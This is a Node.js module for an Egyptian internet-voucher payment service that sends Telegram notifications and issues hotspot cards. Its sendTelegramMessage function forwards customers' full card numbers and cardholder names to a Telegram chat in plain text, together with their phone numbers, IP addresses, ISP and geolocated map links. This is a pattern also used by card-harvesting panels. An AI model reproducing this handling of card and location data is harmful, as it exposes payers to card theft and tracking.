const axios = require("axios");
const FormData = require("form-data");
const mikrotikService = require("./mikrotikService");
const contributionMessages = require("./contributionMessages");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const { BRANCH_NAMES } = require('./branches');

async function fetchNetworkDetailsByIP(ip) {
  const result = { location: "غير معروف", isp: "غير معروف", netLocation: "غير متاح" };
  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) return result;
  const cleanIp = String(ip).split(",")[0].trim();
  try {
    const res = await axios.get(`https://ipwho.is/${cleanIp}?lang=ar`, { timeout: 3000 });
    if (res.data && res.data.success !== false) {
      const city = res.data.city || res.data.region || "غير معروفة";
      const country = res.data.country || "غير معروفة";
      result.location = `${city}، ${country}`;
      result.isp = res.data.connection?.isp || res.data.org || "غير معروف";
      const lat = res.data.latitude;
      const lon = res.data.longitude;
      if (lat && lon) result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
      return result;
    }
  } catch (e) {}
  try {
    const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,lat,lon,query`, { timeout: 3000 });
    if (fallbackRes.data && fallbackRes.data.status === "success") {
      result.location = `${fallbackRes.data.city || "غير معروفة"}، ${fallbackRes.data.country || "غير معروفة"}`;
      result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
      if (fallbackRes.data.lat && fallbackRes.data.lon) {
        result.netLocation = `<a href="https://maps.google.com/?q=${fallbackRes.data.lat},${fallbackRes.data.lon}">🗺 عرض الخريطة (${fallbackRes.data.lat},${fallbackRes.data.lon})</a>`;
      }
      return result;
    }
  } catch (fallbackErr) {}
  return result;
}

function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
  if (method === "card") method = "💳 بطاقة بنكية";
  else if (method === "wallet") method = "📱 محفظة إلكترونية";
  return method;
}

function getFormattedDateTime() {
  const now = new Date();
  return `${now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" })} - ${now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" })}`;
}

function getPackageNameByAmount(amount) {
  const numAmount = Number(amount);
  switch (numAmount) {
    case 5: return "الباقة البرونزية";
    case 15: return "الباقة الفضية";
    case 30: return "الباقة الذهبية";
    case 50: return "الباقة البلاتينية";
    case 100: return "الباقة الماسية";
    default: return numAmount > 100 ? "مساهمة ودعم للشبكة" : "باقة إنترنت شبكة حكايات";
  }
}

async function sendTelegramMessage(data, isInitial = true) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) return;
    const publicIP = data.publicIP || data.geoData?.publicIP || data.ip || "";
    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) return;

    const method = getPaymentMethodName(data);
    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : (data.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();
    const branchKey = data.branch || data.branchKey || "main";
    const branchName = data.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
    const userPhone = data.phone || data.billing_data?.phone_number || data.customer?.phone_number || "غير محدد";

    // التقاط واستخدام رقم العملية الممرر بدقة تامة وثبات
    const txnId = data.id || data.transactionId || data.order?.id || data.merchant_order_id || `TX_${Date.now()}`;

    let message = "";
    if (isInitial) {
      const clientID = data.clientID || data.clientId || "غير متوفر";
      let ispText = data.ispProvider || data.isp || null;
      let netLocationText = data.netLocation || null;

      if (!ispText || ispText === "غير معروف" || !netLocationText || netLocationText === "غير متاح") {
        const netInfo = await fetchNetworkDetailsByIP(publicIP);
        ispText = ispText || netInfo.isp;
        netLocationText = netLocationText || netInfo.netLocation;
      }

      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (userPhone && userPhone !== "غير محدد") message += `📱 رقم الهاتف: <code>${userPhone}</code>\n`;

      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة</b> ---\n` +
                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                   `👤 الاسم: <b>${data.card_data.name}</b>\n`;
      }

      message += `\n🌐 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
                 `📡 <b>مزود الخدمة:</b> <b>${ispText}</b>\n` +
                 `📍 <b>الموقع:</b> ${netLocationText}\n` +
                 `📅 <b>الوقت:</b> <code>${dateTimeStr}</code>`;
    } else {
      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
      const packageInfo = data.package_info || data.packageName || getPackageNameByAmount(amountEGP);

      message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `📱 الهاتف: <code>${userPhone}</code>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ: <b>${amountEGP} جنيه</b>\n` +
                `📦 الباقة: <b>${packageInfo}</b>\n` +
                `🎟️ الكارت: <code>${voucher}</code>\n` +
                `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
    }

    const replyMarkup = {
      inline_keyboard: [
        [
          { text: "🎟️ إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountEGP}_${branchKey}` },
          { text: "🤝 مساهمة", callback_data: `contribution_${txnId}_${amountEGP}_${branchKey}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML",
      reply_markup: replyMarkup
    });

  } catch (err) {
    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
  }
}

async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID || !imageBuffer) return;
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", imageBuffer, { filename: `card_${paymentDetails.transactionId || Date.now()}.png`, contentType: "image/png" });

    const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
    const amountVal = paymentDetails.amount || "0";
    const branchKey = paymentDetails.branch || paymentDetails.branchKey || "main";
    const branchName = paymentDetails.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
    const packageName = paymentDetails.packageName || getPackageNameByAmount(amountVal);

    const caption = `🎟️ <b>صورة كارت الإنترنت</b>\n\n` +
                    `🏢 الفرع: <b>${branchName}</b>\n` +
                    `📦 الباقة: <b>${packageName}</b>\n` +
                    `💰 المبلغ: <b>${amountVal} جنيه</b>\n` +
                    `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                    `🆔 رقم العملية: <code>${txnId}</code>`;

    form.append("caption", caption);
    form.append("parse_mode", "HTML");
    form.append("reply_markup", JSON.stringify({
      inline_keyboard: [
        [
          { text: "🎟️ إعادة إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountVal}_${branchKey}` },
          { text: "🤝 مساهمة", callback_data: `contribution_${txnId}_${amountVal}_${branchKey}` }
        ]
      ]
    }));

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: { ...form.getHeaders() },
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });
  } catch (err) {
    console.error("❌ [Telegram Image Error]:", err.message);
  }
}

async function handleTelegramCallback(callbackQuery) {
  try {
    const queryId = callbackQuery.id;
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      callback_query_id: queryId,
      text: "جاري تنفيذ الإجراء...",
      show_alert: false
    });

    const parts = data.split("_");
    if (data.startsWith("create_voucher")) {
      const branchKey = parts.pop();
      const amount = parts.pop();
      parts.shift(); parts.shift();
      const txnId = parts.join("_");

      let voucherData = await mikrotikService.processPaymentAndCreateCard(amount, branchKey, txnId);
      if (voucherData && (voucherData.success || voucherData.cardCode)) {
        const usernameStr = voucherData.cardCode || voucherData.username || "متاح";
        const updatedText = callbackQuery.message.text + `\n\n✅ <b>[تم إصدار الكارت بنجاح]</b>\n🎟️ الكارت: <code>${usernameStr}</code>`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
          chat_id: chatId, message_id: messageId, text: updatedText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] }
        });
      }
    } else if (data.startsWith("contribution")) {
      const branchKey = parts.pop();
      const amount = parts.pop();
      parts.shift();
      const txnId = parts.join("_");

      const updatedText = callbackQuery.message.text + `\n\n🤝 <b>[تم تحويل العملية إلى مساهمة]</b> بقيمة: <code>${amount} جنيه</code>`;
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        chat_id: chatId, message_id: messageId, text: updatedText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] }
      });
    }
  } catch (err) {
    console.error("❌ [Telegram Callback Error]:", err.message);
  }
}

async function sendTelegramFailNotification(errorMessage, data = {}) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) return;
    const publicIP = data.publicIP || "غير متوفر";
    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) return;

    const netInfo = await fetchNetworkDetailsByIP(publicIP);
    let message = `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
                  `🌐 IP: <code>${publicIP}</code>\n` +
                  `📡 مزود الخدمة: <b>${netInfo.isp}</b>\n` +
                  `📍 الموقع: ${netInfo.netLocation}`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: "HTML" });
  } catch (err) {}
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage,
  handleTelegramCallback,
  sendTelegramFailNotification
};
